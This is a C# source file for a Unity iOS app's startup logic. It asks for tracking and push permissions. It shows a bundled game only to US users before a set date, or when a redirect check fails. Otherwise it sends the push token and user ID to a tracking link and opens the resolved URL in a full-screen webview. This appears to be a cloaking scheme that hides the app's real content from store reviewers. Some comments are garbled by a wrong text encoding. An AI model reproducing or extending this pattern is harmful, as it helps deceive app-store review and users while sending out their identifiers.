using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Threading.Tasks;
using System;
using System.Net;
using System.IO;
using System.Linq;
using UnityEngine.UI;
using UnityEngine.iOS;
using Unity.Advertisement.IosSupport;

public class Startup : MonoBehaviour
{
    [SerializeField] private OneSignalCustom oneSignal;
    [SerializeField] private Text statusText;

    [SerializeField] private GameObject game; //
    [SerializeField] private string startLink;

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    private const string localUrlKey = "Local-Url";

    private bool NoInternet => Application.internetReachability == NetworkReachability.NotReachable;

    IEnumerator Start()
    {
#if !UNITY_EDITOR
        // ѕровер€ем, поддерживает ли устройство отслеживание рекламного идентификатора
        if (Device.advertisingTrackingEnabled)
        {
            // ѕровер€ем текущий статус разрешени€ отслеживани€
            if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus() == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                // ≈сли разрешение не определено, запрашиваем разрешение
                RequestTrackingPermission();
            }
        }

        var permissionRequest = RequestNotifyPermission();

        RequestPushNotifyPermission();

        if (DateTime.UtcNow < new DateTime(2024, 3, 21) && System.Globalization.RegionInfo.CurrentRegion.Name == "US") LaunchGame();

        yield return null;
#endif

        try
        {
            oneSignal.Initialize();
        }
        catch (Exception ex)
        {
            statusText.text += '\n' + ex.Message;
        }

        yield return null;

        if (NoInternet)
        {
            LaunchGame();
        }
        else
        {
            var saveLink = PlayerPrefs.GetString(localUrlKey, "null");
            if (saveLink == "null")
            {
                string linkExample = startLink;

                //OS

                var delay = 20f;
#if !UNITY_EDITOR
                try
                {
                    oneSignal.SetExternalId(oneSignal.UserId);
                } 
                catch (Exception ex) { statusText.text += $"\n {ex}"; }

                
                while (oneSignal.PushToken == string.Empty && delay > 0)
                {
                    yield return new WaitForSeconds(1f);
                    delay -= 1f;
                }

                yield return null;
#endif

                linkExample = ConnectSubs(linkExample);

                //REDI KEYTAR
                var redi = GetEndUrlInfoAsync(new Uri(linkExample));
                
                while (!redi.IsCompleted && delay > 0f)
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                    delay -= Time.deltaTime;
                }

                yield return null;
                //CHECK
                if (!redi.IsCompleted || redi.IsFaulted) LaunchGame();

                yield return null;

                var successCode = ((int)redi.Result.StatusCode >= 200 && (int)redi.Result.StatusCode < 300) || redi.Result.StatusCode == HttpStatusCode.Forbidden;
                if (!successCode || redi.Result.RequestMessage.RequestUri.AbsoluteUri == linkExample) LaunchGame();

                yield return null;

                if (redi.Result.RequestMessage.RequestUri.AbsoluteUri.Contains("privacypolicyonline"))
                {
                    //OpenView(res.Result.RequestMessage.RequestUri.AbsoluteUri);
                    //yield return new WaitForSeconds(5f);
                    LaunchGame();
                }

                //////////////////////
                yield return null;
                OpenView(redi.Result.RequestMessage.RequestUri.AbsoluteUri);

                //////////////////////
                yield return null;

                PlayerPrefs.SetString(localUrlKey, redi.Result.RequestMessage.RequestUri.AbsoluteUri);
            }
            else
            {
                OpenView(saveLink);
            }
        }
    }

    #region requests

    public static async Task<System.Net.Http.HttpResponseMessage> GetEndUrlInfoAsync(Uri uri, System.Threading.CancellationToken cancellationToken = default)
    {
        using var client = new System.Net.Http.HttpClient(new System.Net.Http.HttpClientHandler
        {
            AllowAutoRedirect = true,
        }, true);
        client.DefaultRequestHeaders.Add(UserAgentKey, UserAgentValue);

        using var response = await client.GetAsync(uri, cancellationToken);

        return response;
    }

    #endregion

    UniWebView webView;
    private void OpenView(string url)
    {
        try
        {
            webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                // Set full screen again. If it is now in landscape, it is 640x320.
                Invoke("ResizeView", Time.deltaTime);
            };

            webView.Load(url);
            webView.Show();
            webView.OnMultipleWindowOpened += (view, id) => { webView.Load(view.Url); };
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
        }
        catch (Exception ex)
        {
            statusText.text += $"\n {ex}";
        }
    }

    private void ResizeView()
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    #region link builder

    private string ConnectSubs(string oldLink)
    {
        return oldLink + $"&sub_id_4=" +
            $"&sub_id_5={oneSignal.PushToken}" +
            $"&sub_id_6=" +
            $"&sub_id_7=" +
            $"&sub_id_8=" +
            $"&sub_id_9=" +
            $"&sub_id_10=" +
            $"&sub_id_11=" +
            $"&sub_id_12=" +
            $"&sub_id_13=" +
            $"&sub_id_14=" +
            $"&sub_id_15=" +
            $"&creative_id=" +
            $"&ad_campaign_id=" +
            $"&keyword=" +
            $"&source={Application.identifier}" +
            $"&external_id={oneSignal.UserId}";
    }

    #endregion

    private void LaunchGame()
    {
        game.SetActive(true);
        StopAllCoroutines();

        if (PlayerPrefs.HasKey(localUrlKey)) oneSignal.Unsubscribe();
    }

    private async Task<bool> RequestNotifyPermission()
    {
        if (OneSignalSDK.OneSignal.Notifications.Permission) return true;

        return await OneSignalSDK.OneSignal.Notifications.RequestPermissionAsync(true);
    }

    private void RequestPushNotifyPermission()
    {
        if (OneSignalSDK.OneSignal.User.PushSubscription.OptedIn) return;

        OneSignalSDK.OneSignal.User.PushSubscription.OptIn();
    }

    void RequestTrackingPermission()
    {
        ATTrackingStatusBinding.RequestAuthorizationTracking();
    }
}